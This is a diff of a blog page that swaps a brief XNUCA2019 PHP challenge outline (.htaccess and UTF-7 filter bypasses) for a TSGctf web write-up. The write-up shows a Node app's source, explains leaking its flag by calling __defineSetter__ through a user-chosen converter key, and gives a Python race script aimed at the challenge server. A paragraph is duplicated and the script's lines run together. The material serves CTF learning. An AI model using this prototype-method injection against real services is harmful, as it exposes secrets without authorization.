@@ -16,7 +16,7 @@
   <meta name="description" content="">
   <meta name="author" content="">
   <meta name="keywords" content="">
-  <title>[XNUCA2019Qualifier]EasyPHP ~ Xiaotan</title>
+  <title>TSGctf web ~ Xiaotan</title>
 
   <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
 <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
@@ -118,7 +118,7 @@
               
                 <p class="mt-3">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  Wednesday, May 13th 2020, 5:24 pm
+                  Tuesday, July 14th 2020, 9:59 am
                 </p>
               
 
@@ -127,7 +127,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    68 字
+                    808 字
                   </span>&nbsp;
                 
 
@@ -135,7 +135,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      1 分钟
+                      5 分钟
                   </span>&nbsp;
                 
 
@@ -168,20 +168,132 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
-            <h2 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2><ul>
-<li>解法一<ul>
-<li>[1、error_log结合log_errors自定义错误日志]</li>
-<li>[2、include_path设置包含路径]</li>
-<li>[3、php_value zend.multibyte 1结合php_value zend.script_encoding “UTF-7”绕过尖括号&lt;过滤]</li>
-<li>[4、# \ 绕过.htaccess中多余字符]</li>
-</ul>
-</li>
-<li>解法二<ul>
-<li>[5、.htaccess配置prce绕过正则匹配]</li>
-</ul>
-</li>
-<li>[解法三]</li>
-</ul>
+            <p>TSGctf web</p>
+<p>Code：</p>
+<pre><code>const fastify = require(&#39;fastify&#39;);
+const nunjucks = require(&#39;nunjucks&#39;);
+const crypto = require(&#39;crypto&#39;);
+
+
+const converters = {};
+
+const flagConverter = (input, callback) =&gt; {
+  const flag = &#39;*** CENSORED ***&#39;;
+  callback(null, flag);
+};
+
+const base64Converter = (input, callback) =&gt; {
+  try {
+    const result = Buffer.from(input).toString(&#39;base64&#39;);
+    callback(null, result)
+  } catch (error) {
+    callback(error);
+  }
+};
+
+const scryptConverter = (input, callback) =&gt; {
+  crypto.scrypt(input, &#39;I like sugar&#39;, 64, (error, key) =&gt; {
+    if (error) {
+      callback(error);
+    } else {
+      callback(null, key.toString(&#39;hex&#39;));
+    }
+  });
+};
+
+
+const app = fastify();
+app.register(require(&#39;point-of-view&#39;), {engine: {nunjucks}});
+app.register(require(&#39;fastify-formbody&#39;));
+app.register(require(&#39;fastify-cookie&#39;));
+app.register(require(&#39;fastify-session&#39;), {secret: Math.random().toString(2), cookie: {secure: false}});
+
+app.get(&#39;/&#39;, async (request, reply) =&gt; {
+  reply.view(&#39;index.html&#39;, {sessionId: request.session.sessionId});
+});
+
+app.post(&#39;/&#39;, async (request, reply) =&gt; {
+  if (request.body.converter.match(/[FLAG]/)) {
+    throw new Error(&quot;Don&#39;t be evil :)&quot;);
+  }
+
+  if (request.body.input.length &lt; 10) {
+    throw new Error(&#39;Too short :(&#39;);
+  }
+
+  if (request.body.input.length &gt; 1000) {
+    throw new Error(&#39;Too long :(&#39;);
+  }
+
+  converters[&#39;base64&#39;] = base64Converter;
+  converters[&#39;scrypt&#39;] = scryptConverter;
+  converters[`FLAG_${request.session.sessionId}`] = flagConverter;
+
+  const result = await new Promise((resolve, reject) =&gt; {
+    converters[request.body.converter](request.body.input, (error, result) =&gt; {
+      if (error) {
+        reject(error);
+      } else {
+        resolve(result);
+      }
+    });
+  });
+
+  reply.view(&#39;index.html&#39;, {
+    input: request.body.input,
+    result,
+    sessionId: request.session.sessionId,
+  });
+});
+
+app.setErrorHandler((error, request, reply) =&gt; {
+  reply.view(&#39;index.html&#39;, {error, sessionId: request.session.sessionId});
+});
+
+app.listen(59101, &#39;0.0.0.0&#39;);</code></pre><p>I never expected to be able to read JS, but because of the foundation of learning other languages, I was able to understand this simple code, so I wanted others to try it out.</p>
+<p>1.By reading the source code, we can easily find several key points.</p>
+<pre><code>const flagConverter = (input, callback) =&gt; {
+  const flag = &#39;*** CENSORED ***&#39;;
+  callback(null, flag);
+};</code></pre><pre><code>app.post(&#39;/&#39;, async (request, reply) =&gt; {
+  if (request.body.converter.match(/[FLAG]/)) {
+    throw new Error(&quot;Don&#39;t be evil :)&quot;);
+  }</code></pre><pre><code> converters[&#39;base64&#39;] = base64Converter;
+  converters[&#39;scrypt&#39;] = scryptConverter;
+  converters[`FLAG_${request.session.sessionId}`] = flagConverter;</code></pre><p>So we need to bypass FLAG filtering. But I know little about JS. I didn’t know until after the game:</p>
+<ol>
+<li>Objects have multiple intrinsic JS function, one of them can be used to spit out the flag in errors :)</li>
+</ol>
+<pre><code>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineSetter__</code></pre><p>The defineSetter function of any object is way to do extra things in callback when a values are assigned to its keys.</p>
+<pre><code>var o = {};
+o.__defineSetter__(&#39;key&#39;, function(value) { //we access value in callback });</code></pre><p>So following code</p>
+<pre><code>converters[request.body.converter](request.body.input, (error, result) =&gt; {
+      if (error) {
+        reject(error);
+      } else {
+        resolve(result);
+      }
+    });</code></pre><p>with <code>request.body.converter = __defineSetter__</code> and <code>request.body.input = FLAG_sessionId</code></p>
+<p>will assign following callback for whenever converter object gets key <code>FLAG_sessionId</code> assigned a value.</p>
+<pre><code>(error, result) =&gt; {
+      if (error) {
+        reject(error);
+      } else {
+        resolve(result);
+      }
+    });</code></pre><p>In the first request, We just assign the callback and the Promise does not gets resolved so we are stuck at <code>const result = await new Promise((resolve, reject)</code></p>
+<p>In the second consecutive request, The code <code>converters[</code>FLAG_${request.session.sessionId}<code>] = flagConverter;</code></p>
+<p>will assign the value <code>flagConverter</code> function to our unique key for which we have set a callback, this <code>flagConverter</code> function will get passed down to callback as error and Our Promise will get rejected and the result gets assign with the whole function, and this result gets spit out in response to our first request which was waiting for this to happen.</p>
+<p>In the first request, We just assign the callback and the Promise does not gets resolved so we are stuck at <code>const result = await new Promise((resolve, reject)</code></p>
+<p>In the second consecutive request, The code <code>converters[</code>FLAG_${request.session.sessionId}<code>] = flagConverter;</code></p>
+<p>will assign the value <code>flagConverter</code> function to our unique key for which we have set a callback, this <code>flagConverter</code> function will get passed down to callback as error and Our Promise will get rejected and the result gets assign with the whole function, and this result gets spit out in response to our first request which was waiting for this to happen.</p>
+<pre><code class="python">import threading
+import requests
+import time 
+cookie = {&quot;sessionId&quot; : &quot;HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa.YTlYOIhk52YHs3NzP%2FFPuu6y7MK1ev6uX21jHbgxMXE&quot;}
+def sendPayload():    
+    r = requests.post(&quot;http://34.85.124.174:59101&quot;,json=       {&quot;converter&quot;:&quot;__defineSetter__&quot;,&quot;input&quot;:&quot;FLAG_HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa&quot;},cookies=cookie)    
+    print(r.text) threading.Thread(target=sendPayload).start()time.sleep(1)requests.post(&quot;http://34.85.124.174:59101&quot;,json={&quot;converter&quot;:&quot;base64&quot;,&quot;input&quot;:&quot;FLAG_HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa&quot;},cookies=cookie)</code></pre>
 
             <hr>
           </div>
@@ -341,7 +453,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "[XNUCA2019Qualifier]EasyPHP&nbsp;",
+        "TSGctf web&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
